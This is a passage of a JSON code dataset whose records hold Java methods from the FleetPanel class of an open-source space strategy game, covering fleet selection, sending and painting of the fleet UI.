"FleetPanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void clearStackAdjustments() {\n        adjustedFleet(null);\n        for (int i=0;i<stackAdjustment.length;i++)\n            stackAdjustment[i] = 0;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56964, "method_name": "haveClickedOnCurrentFleet", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean haveClickedOnCurrentFleet() {\n        // is the current clicked sprite a Fleet?\n        return parent.parent.isClicked(displayedFleet());\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56965, "method_name": "canConsume", "class_name": "FleetPanel", "params": ["Sprite"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean canConsume(Sprite s) {\n        return (s == null) || (s instanceof ShipFleet) || (s instanceof StarSystem);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56966, "method_name": "canSendFleet", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean canSendFleet() {\n        if (selectedDest() == null)\n            return false;\n\n        ShipFleet newFleet = adjustedFleet();\n        if (newFleet.isEmpty())\n            return false;\n\n        return newFleet.canReach(selectedDest());\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56967, "method_name": "newAdjustedFleet", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "ShipFleet", "snippet": "    private ShipFleet newAdjustedFleet() {\n        ShipFleet selectedFleet = selectedFleet();\n        if (selectedFleet == null) {\n            selectedFleet(null);\n            return null;\n        }\n        if (!selectedFleet.isActive())\n            return null;\n\n        if (selectedFleet.deployed())\n            return selectedFleet;\n\n        ShipFleet newFleet = ShipFleet.copy(selectedFleet);\n        for (int i=0;i<stackAdjustment.length;i++)\n            newFleet.addShips(i, stackAdjustment[i]);\n        newFleet.rallySysId(selectedFleet.rallySysId());\n        newFleet.retreating(selectedFleet.retreating());\n        return newFleet;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56968, "method_name": "sendFleet", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendFleet() {\n        // attempts to send fleet (OK button) if that selected\n        // vars are valid\n        if (!canSendFleet()) \n            return;\n\n        ShipFleet newFleet = adjustedFleet();\n        ShipFleet displayedFleet = displayedFleet();\n\n        if (displayedFleet.isInTransit())\n            galaxy().ships.redirectFleet(displayedFleet, selectedDest().id);\n        else {\n            boolean newFleetCreated = galaxy().ships.deploySubfleet(displayedFleet, newFleet.num, selectedDest().id);\n            // newFleet isEmpty if it was the entire fleet selected\n            if (newFleetCreated) {\n                if (displayedFleet.isEmpty()) \n                    cancelFleet();\n                else {\n                    selectNewFleet(displayedFleet);\n                    adjustStacksToMatchFleet(displayedFleet, newFleet);\n                }\n            }\n            else {\n                cancelFleet();\n            }\n        }\n        FlightPathSprite.clearWorkingPaths();\n        parent.parent.map().repaint();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56969, "method_name": "undeployFleet", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void undeployFleet() {\n        galaxy().ships.undeployFleet(selectedFleet());\n        selectNewFleet(null);\n        parent.parent.reselectCurrentSystem();\n        parent.parent.map().repaint();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56970, "method_name": "cancelFleet", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void cancelFleet() {\n        selectNewFleet(null);\n        parent.parent.reselectCurrentSystem();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56971, "method_name": "selectNewFleet", "class_name": "FleetPanel", "params": ["ShipFleet"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void selectNewFleet(ShipFleet fl) {\n        clearStackAdjustments();\n        adjustedFleet(null);\n        tentativeDest(null);\n        selectedDest(null);\n        displayedFleet(fl);\n        selectedFleet(fl);\n        FlightPathSprite.clearWorkingPaths();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56972, "method_name": "adjustStacksToMatchFleet", "class_name": "FleetPanel", "params": ["ShipFleet", "ShipFleet"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void adjustStacksToMatchFleet(ShipFleet selected, ShipFleet deployed) {\n        int selectedCount = 0;\n        for (int i=0;i<stackAdjustment.length;i++) {\n            if (selected.num(i) <= deployed.num(i)) \n                stackAdjustment[i] = 0;\n        else\n                    stackAdjustment[i] = deployed.num(i) - selected.num(i);\n            selectedCount += (selected.num(i)+stackAdjustment[i]);\n        }\n        // if what remains is a selected fleet adjusted down to 0, then\n        // clear the adjustments\n        if (selectedCount == 0) \n            clearStackAdjustments();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56973, "method_name": "useHoveringSprite", "class_name": "FleetPanel", "params": ["Sprite"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean useHoveringSprite(Sprite o) {\n        if (!canConsume(o))\n            return false;\n\n        // no selected fleet, so skip. This happens from when we have selected\n        // a system, hover over a fleet (displaying this UI), and then\n        // hover over a system (which can be used by this UI so it gets this far)\n        if (selectedFleet() == null)\n            return false;\n\n        // SHOULD NEVER OCCUR as these sprites fail the prior check\n        // any hovered fleets are consumed with no action\n        if ((o instanceof ShipFleet)\n        || (o instanceof FlightPathSprite)) {\n            tentativeDest(null);\n            FlightPathSprite.clearWorkingPaths();\n            return haveClickedOnCurrentFleet();\n        }\n\n        if (o == null) {\n            // if we aren't currently hovering over a target system,\n            // then we aren't using this null to clear it out\n            if (tentativeDest() == null)\n                return false;\n            if (haveClickedOnCurrentFleet()) {\n                if (selectedDest() == null) \n                    FlightPathSprite.clearWorkingPaths();\n                else\n                    adjustedFleet().use(selectedDest(), parent.parent);\n            }\n            else {\n                // we were hovering over fleet, so default back to selected fleet\n                displayedFleet(null);\n            }\n            tentativeDest(null);\n            adjustedFleet(null);\n            parent.parent.repaint();\n            return haveClickedOnCurrentFleet();\n        }\n\n        // if we are not a System, quit now\n        if (!(o instanceof StarSystem))\n            return false;\n        \n        if (adjustedFleet() == null)\n            return false;\n\n        if (adjustedFleet().empire() != player())\n            return false;\n\n        adjustedFleet().use(o, parent.parent);\n        tentativeDest((StarSystem) o);\n        return true;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56974, "method_name": "useNullClick", "class_name": "FleetPanel", "params": ["int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean useNullClick(int cnt, boolean right) {\n        if (right) {\n            cancelFleet();\n            return true;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56975, "method_name": "useClickedSprite", "class_name": "FleetPanel", "params": ["Sprite", "int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean useClickedSprite(Sprite o, int count, boolean rightClick) {\n        // we have clicked on a system view at this point\n        if (rightClick) {\n            cancelFleet();\n            return true;\n        }\n\n        // use clicked Fleets that can be sent... just reset vars\n        if (o instanceof ShipFleet) {\n            ShipFleet clickedFleet = (ShipFleet) o;\n            if (clickedFleet.empire() != player())\n                return false;\n            if (clickedFleet != selectedFleet())\n                selectNewFleet(clickedFleet);\n            return false;\n        }\n\n        if (o instanceof FlightPathSprite)  \n            return true;    \n\n        // clicking on anything but a systemview\n        // will leave this screen\n        if (!(o instanceof StarSystem)) \n            return false;\n\n        // special case check:\n        // on Cancel, then selected fleet is null and we get\n        // here when the last selected system is reselected\n        if (selectedFleet() == null) \n            return false;\n        \n        if (selectedFleet().empire() != player())\n            return false;\n        \n        StarSystem sys = (StarSystem) o;\n\n        if (selectedFleet().destSysId() == sys.id) \n            return false;\n\n        tentativeDest(sys);\n        // don't accept clicks for out of range systems\n        // but consume the click (to stay on this view)\n        ShipFleet adjustedFleet = adjustedFleet();\n        if (adjustedFleet == null) \n            return false;\n        if (!adjustedFleet.canReach(sys)) { \n            misClick();\n            return true;\n        }\n        if (!adjustedFleet.canSendTo(id(sys))) {\n            misClick();\n            return true;\n        }\n\n        // if we are selecting a system that the selected fleet\n        // is orbiting, then consume the event but do nothing\n        if (adjustedFleet.system() == sys) \n            return true;\n\n        softClick();\n        selectedDest(sys);\n        adjustedFleet.use(o, parent.parent);\n        //if (count == 2)\n        sendFleet();\n        return true;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56976, "method_name": "keyPressed", "class_name": "FleetPanel", "params": ["KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void keyPressed(KeyEvent e) {\n        int k = e.getKeyCode();\n        switch (k) {\n            case KeyEvent.VK_ESCAPE:\n                buttonClick();\n                cancelFleet();\n                return;\n            case KeyEvent.VK_SPACE:\n                buttonClick();\n                sendFleet();\n                return;\n            case KeyEvent.VK_TAB:\n                // tab-targeting for transports\n                ShipFleet fl = adjustedFleet();\n                StarSystem currSys;\n                if (tentativeDest() != null)\n                    currSys = tentativeDest();\n                else {\n                    int currSysId = fl.isInTransit() ? fl.destSysId() : fl.sysId();\n                    currSys = galaxy().system(currSysId);\n                }\n                List<StarSystem> systems = player().orderedFleetTargetSystems(fl);\n                if (systems.size() > 1)\n                    softClick();\n                else\n                    misClick();\n                // find next index (exploit that missing element returns -1, so set to 0)\n                int index = 0;\n                switch(e.getModifiersEx()) {\n                    case 0:\n                        index = systems.indexOf(currSys)+1;\n                        if (index == systems.size())\n                            index = 0;\n                        break;\n                    case 1:\n                        index = systems.indexOf(currSys)-1;\n                        if (index < 0)\n                            index = systems.size()-1;\n                        break;\n                }\n                useClickedSprite(systems.get(index), 1, false);\n                //parent.parent.hoveringOverSprite(systems.get(index).sprite());\n                parent.repaint();\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56977, "method_name": "initModel", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initModel() {\n        setBackground(MainUI.paneBackground());\n\n        topPane = topPane();\n        detailPane = detailPane();\n        bottomPane = bottomPane();\n\n        setLayout(new BorderLayout());\n        if (topPane != null) {\n            topPane.setPreferredSize(new Dimension(getWidth(),scaled(145)));\n            add(topPane, BorderLayout.NORTH);\n        }\n        add(detailPane, BorderLayout.CENTER);\n        if (bottomPane != null) {\n            bottomPane.setPreferredSize(new Dimension(getWidth(),s40));\n            add(bottomPane, BorderLayout.SOUTH);\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56978, "method_name": "topPane", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "BasePanel", "snippet": "    protected BasePanel topPane() {\n        if (topPane == null)\n            topPane = new FleetGraphicPane(this);\n        return topPane;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56979, "method_name": "detailPane", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "BasePanel", "snippet": "    protected BasePanel detailPane() {\n        if (detailPane == null)\n            detailPane = new FleetDetailPane(this);\n        return detailPane;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56980, "method_name": "bottomPane", "class_name": "FleetPanel", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "BasePanel", "snippet": "    protected BasePanel bottomPane() {\n        if (bottomPane == null)\n            bottomPane = new FleetButtonPane(this);\n        bottomPane.setBackground(MainUI.shadeBorderC());\n        return bottomPane;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MapSpriteViewer"], "modifiers": ["public"]}}, {"id": 56981, "method_name": "init", "class_name": "FleetGraphicPane", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void init() {\n            setBackground(Color.black);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": null, "modifiers": ["public"]}}, {"id": 56982, "method_name": "paintComponent", "class_name": "FleetGraphicPane", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void paintComponent(Graphics g0) {\n            Graphics2D g = (Graphics2D) g0;\n            super.paintComponent(g);\n            int w = getWidth();\n            int h = getHeight();\n\n            Empire pl = player();\n            ShipFleet fl = parent.fleetToDisplay();\n\n            // this can happen if the fleet is selected and then\n            // all designs are scrapped before return to main ui\n            if (fl.isEmpty()) {\n                cancelFleet();\n                return;\n            }\n            \n            StarSystem sys = fl.isOrbiting() ? fl.system() : null;\n\n            if (sys == null) {\n                if (fl.hasDestination())\n                    g.drawImage(pl.sv.starBackground(this), 0, 0, null);\n            }\n            else {\n                g.drawImage(pl.sv.starBackground(this), 0, 0, null);\n                drawStar(g, sys.starType(), s80, w/3, s70);\n                sys.planet().draw(g, w, h, s20, s70, s80, 45);\n            }\n            // draw ship image\n            Image shipImg = fl.empire().race().transport();\n            int imgW = shipImg.getWidth(null);\n            int imgH = shipImg.getHeight(null);\n            float scale = (float) s80 / Math.max(imgW, imgH);\n            int shipW = (int) (scale*imgW);\n            int shipH = (int) (scale*imgH);\n            int shipX = s70;\n            int shipY = h-shipH-s10;\n            g.drawImage(shipImg, shipX,shipY,shipX+shipW,shipY+shipH, 0,0,imgW,imgH, null);\n\n            // draw title\n            g.setFont(narrowFont(36));\n            String str1 = text(\"MAIN_FLEET_TITLE\", fl.empire().raceName());\n            drawBorderedString(g, str1, 2, s15, s42, Color.black, SystemPanel.orangeText);\n\n            // draw orbiting data, bottom up\n            int y0 = h-s12;\n            g.setColor(SystemPanel.whiteText);\n            g.setFont(narrowFont(20));\n            if (fl.launched()) {\n                if (pl.knowETA(fl) && (fl.hasDestination())) {\n                    String dest =  pl.sv.name(fl.destSysId());\n                    String str2 = dest.isEmpty() ? text(\"MAIN_FLEET_DEST_UNSCOUTED\") : text(\"MAIN_FLEET_DESTINATION\", dest);\n                    int sw2 = g.getFontMetrics().stringWidth(str2);\n                    g.drawString(str2, w-sw2-s10, y0);\n                    y0 -= s25;\n                }\n                String str3 = fl.retreating() ? text(\"MAIN_FLEET_RETREATING\") : text(\"MAIN_FLEET_IN_TRANSIT\");\n                int sw3 = g.getFontMetrics().stringWidth(str3);\n                g.drawString(str3, w-sw3-s10, y0);\n                y0 -= s25;\n                if (!fl.empire().isPlayer()) {\n                    if (pl.alliedWith(fl.empId)) {\n                        g.setColor(SystemPanel.greenText);\n                        String str4 = text(\"MAIN_FLEET_ALLY\");\n                        int sw4 = g.getFontMetrics().stringWidth(str4);\n                        g.drawString(str4, w-sw4-s10, y0);\n                    } else if (pl.atWarWith(fl.empId)) {\n                        g.setColor(SystemPanel.redText);\n                        String str4 = text(\"MAIN_FLEET_ENEMY\");\n                        int sw4 = g.getFontMetrics().stringWidth(str4);\n                        g.drawString(str4, w-sw4-s10, y0);\n                    }\n                }\n            }\n            else if (fl.deployed()) {\n                String dest =  pl.sv.name(fl.destSysId());\n                String str2 = dest.isEmpty() ? text(\"MAIN_FLEET_DEST_UNSCOUTED\") : text(\"MAIN_FLEET_DESTINATION\", dest);\n                int sw2 = g.getFontMetrics().stringWidth(str2);\n                g.drawString(str2, w-sw2-s10, y0);\n                y0 -= s25;\n                StarSystem sys1 = fl.system();\n                String str3 = text(\"MAIN_FLEET_ORIGIN\", pl.sv.name(sys1.id));\n                int sw3 = g.getFontMetrics().stringWidth(str3);\n                g.drawString(str3, w-sw3-s10, y0);\n                y0 -= s25;\n                String str4 = text(\"MAIN_FLEET_DEPLOYED\");\n                int sw4 = g.getFontMetrics().stringWidth(str4);\n                g.drawString(str4, w-sw4-s10, y0);\n            }\n            else {\n                StarSystem sys1 = fl.system();\n                String str2 = sys1 == null ? \"\" : text(\"MAIN_FLEET_LOCATION\", pl.sv.name(sys1.id));\n                if (str2.isEmpty()) \n                    log(\"ERROR: No system assigned to fleet \");             \n                int sw2 = g.getFontMetrics().stringWidth(str2);\n                g.drawString(str2, w-sw2-s10, y0);\n                y0 -= s25;\n                String str3 = text(\"MAIN_FLEET_IN_ORBIT\");\n                int sw3 = g.getFontMetrics().stringWidth(str3);\n                g.drawString(str3, w-sw3-s10, y0);\n            }\n            g.setColor(MainUI.shadeBorderC());\n            g.fillRect(0, h-s5, w, s5);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": null, "modifiers": ["public"]}}, {"id": 56983, "method_name": "init", "class_name": "FleetDetailPane", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void init() {\n            for (int i=0;i<ShipDesignLab.MAX_DESIGNS;i++) {\n                shipBox[i] = new Rectangle();\n                minBox[i] = new Polygon();\n                maxBox[i] = new Polygon();\n                downBox[i] = new Polygon();\n                upBox[i] = new Polygon();\n            }\n            addMouseListener(this);\n            addMouseMotionListener(this);\n            addMouseWheelListener(this);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56984, "method_name": "textureName", "class_name": "FleetDetailPane", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String textureName()            { return TEXTURE_GRAY; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56985, "method_name": "textureClip", "class_name": "FleetDetailPane", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Shape", "snippet": "        public Shape textureClip()     { return textureClip; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56986, "method_name": "paintComponent", "class_name": "FleetDetailPane", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void paintComponent(Graphics g0) {\n            Graphics2D g = (Graphics2D) g0;\n            super.paintComponent(g0);\n            int w = getWidth();\n            int h = getHeight();\n            int h1 = s90;\n\n            Empire pl = player();\n            ShipFleet origFleet = parent.fleetToDisplay();\n            if (origFleet == null)\n                return;\n            ShipFleet displayFleet = origFleet;\n            // do we want to display an adjustable fleet based on selected fleet?\n            boolean canAdjust = (origFleet != null) && origFleet.canBeAdjustedBy(pl);\n            if ((origFleet == null) || canAdjust)\n                displayFleet = adjustedFleet();\n\n            if (displayFleet == null)\n                displayFleet = origFleet;\n\n            clearButtons();\n            drawInfo(g,displayFleet, 0,0,w,h1);\n            drawFleet(g,origFleet,displayFleet, canAdjust,0,h1,w,h-h1);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56987, "method_name": "clearButtons", "class_name": "FleetDetailPane", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void clearButtons() {\n            for (int i=0;i<shipBox.length;i++) {\n                shipBox[i].setBounds(0,0,0,0);\n                minBox[i].reset();\n                maxBox[i].reset();\n                upBox[i].reset();\n                downBox[i].reset();\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56988, "method_name": "drawInfo", "class_name": "FleetDetailPane", "params": ["Graphics2D", "ShipFleet", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void drawInfo(Graphics2D g, ShipFleet displayFl, int x, int y, int w, int h) {\n            textureClip = new Rectangle2D.Float(x,y,w,h);\n            g.setColor(MainUI.paneBackground());\n            g.fillRect(x, y, w, h);\n\n            int x0 =s10;\n            int y0 = s23;\n            int lineH = s18;\n            String title = displayFl.canBeSentBy(player()) ? text(\"MAIN_FLEET_DEPLOYMENT\") : text(\"MAIN_FLEET_DISPLAY\");\n            g.setFont(narrowFont(26));\n            drawShadowedString(g, title, 4, x0, y0, SystemPanel.textShadowC, Color.white);\n\n            y0 += s5;\n            y0 += lineH;\n\n            StarSystem dest = parent.displayedDestination();\n            String text = null;\n            String text2 = null;\n            g.setFont(narrowFont(16));\n            if (displayFl.canBeSentBy(player())) {\n                if (!displayFl.canSendTo(id(dest))) {\n                    g.setColor(SystemPanel.blackText);\n                    if (dest == null)\n                        text = \"\";\n                    else {\n                        String name = player().sv.name(dest.id);\n                        if (name.isEmpty())\n                            text = text(\"MAIN_FLEET_INVALID_DESTINATION2\");\n                        else \n                            text = text(\"MAIN_FLEET_INVALID_DESTINATION\", name);\n                    }\n                }\n                else if (displayFl.isDeployed() || displayFl.isInTransit()) {\n                    dest = dest == null ? displayFl.destination() : dest;\n                    int dist = displayFl.travelTurns(dest);\n                    String destName = player().sv.name(dest.id);\n                    if (destName.isEmpty())\n                        text = text(\"MAIN_FLEET_ETA_UNNAMED\", dist);\n                    else\n                        text = text(\"MAIN_FLEET_ETA_NAMED\", destName, dist);\n                    if (displayFl.passesThroughNebula(dest))\n                        text2 = text(\"MAIN_FLEET_THROUGH_NEBULA\");\n                }\n                else if (displayFl.canSendTo(id(dest))) {\n                    if (displayFl.canReach(dest)) {\n                        g.setColor(SystemPanel.blackText);\n                        int dist = displayFl.travelTurns(dest);\n                        String destName = player().sv.name(dest.id);\n                        if (destName.isEmpty())\n                            text = text(\"MAIN_FLEET_ETA_UNNAMED\", dist);\n                        else\n                            text = text(\"MAIN_FLEET_ETA_NAMED\", destName, dist);\n                    }\n                    else {\n                        int dist = player().rangeTo(dest);\n                        g.setColor(SystemPanel.blackText);\n                        text = text(\"MAIN_FLEET_OUT_OF_RANGE_DESC\", dist);\n                    }\n                    if (displayFl.passesThroughNebula(dest))\n                        text2 = text(\"MAIN_FLEET_THROUGH_NEBULA\");\n                }\n                else if (displayFl.isOrbiting()) {\n                    g.setColor(SystemPanel.blackText);\n                    text = text(\"MAIN_FLEET_CHOOSE_DEST\");\n                }\n            }\n            else if (displayFl.isInTransit()) {\n                if (player().knowETA(displayFl)) {\n                    g.setColor(Color.black);\n                    int dist = displayFl.travelTurnsRemaining();\n                    if (displayFl.hasDestination()) {\n                        String destName = player().sv.name(displayFl.destSysId());\n                        if (destName.isEmpty())\n                            text = text(\"MAIN_FLEET_ETA_UNNAMED\", dist);\n                        else\n                            text = text(\"MAIN_FLEET_ETA_NAMED\", destName, dist);\n                    }\n                }\n                else {\n                    g.setColor(SystemPanel.redText);\n                    text = text(\"MAIN_FLEET_ETA_UNKNOWN\");\n                }\n            }\n            if (text != null) {\n                List<String> lines = wrappedLines(g, text, w-s30);\n                for (String line: lines) {\n                    g.drawString(line, x0, y0);\n                    y0 += lineH;\n                }\n            }\n            if (text2 != null) {\n                g.setColor(SystemPanel.redText);\n                List<String> lines = wrappedLines(g, text2, w-s30);\n                for (String line: lines) {\n                    g.drawString(line, x0, y0);\n                    y0 += lineH;\n                }\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56989, "method_name": "drawFleet", "class_name": "FleetDetailPane", "params": ["Graphics2D", "ShipFleet", "ShipFleet", "boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void drawFleet(Graphics2D g, ShipFleet origFl, ShipFleet displayFl, boolean canAdjust, int x, int y, int w, int h) {\n            // draw star background\n            g.setColor(Color.black);\n            g.fillRect(x, y, w, h);\n            if (starImg == null) {\n                starImg = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);\n                drawBackgroundStars(starImg, null);\n            }\n            g.drawImage(starImg,x,y,null);\n\n            int spacing = s15;\n            // figure out size of ships\n            int shipW = w/2;\n            int shipH = (h/3)-spacing-spacing; // give room for text above/below ship\n            if  ((shipH *3/2) <  shipW)\n                shipW = shipH * 3/2;\n            else\n                shipH = shipW * 2/3;\n\n            int xAdj = (w-(shipW*2))/3;\n            int yAdj = (h-shipH*2)/3;\n            int midX = x+(w/2);\n            int midY = y+(h/2);\n            int leftX = x+(shipW/2);\n            int rightX = x+w-(shipW/2);\n\n            int topY = y+(shipH/2)+spacing;\n            int botY = y+h-(shipH/2)-spacing;\n\n            // get count of all stacks based on design visibility\n            int[] visible = origFl.visibleShips(player().id);\n            // count how many of those visible designs have ships\n            int num = 0;\n            for (int cnt: visible) {\n                if (cnt > 0)\n                    num++;\n            }\n            \n            boolean sameFleet = (origFl.empId() == displayFl.empId()) && (origFl.sysId() == displayFl.sysId()) && (origFl.destSysId() == displayFl.destSysId());\n            boolean showAdjust = canAdjust && sameFleet;\n            if (origFl != displayFl) {\n                int i = 0;\n            }\n            switch(num) {\n                case 0:\n                    break;\n                case 1:\n                    drawShip(g, origFl, displayFl, showAdjust, 0, midX, midY, shipW, shipH);\n                    break;\n                case 2:\n                    drawShip(g, origFl, displayFl, showAdjust, 0, leftX+xAdj, topY+yAdj, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 1, rightX-xAdj, botY-yAdj, shipW, shipH);\n                    break;\n                case 3:\n                    drawShip(g, origFl, displayFl, showAdjust, 0, leftX, topY, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 1, midX, midY, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 2, rightX, botY, shipW, shipH);\n                    break;\n                case 4:\n                    drawShip(g, origFl, displayFl, showAdjust, 0, leftX+xAdj, topY+yAdj, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 1, rightX-xAdj, topY+yAdj, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 2, leftX+xAdj, botY-yAdj, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 3, rightX-xAdj, botY-yAdj, shipW, shipH);\n                    break;\n                case 5:\n                    drawShip(g, origFl, displayFl, showAdjust, 0, leftX, topY, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 1, rightX, topY, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 2, midX, midY, shipW, shipH);\n                    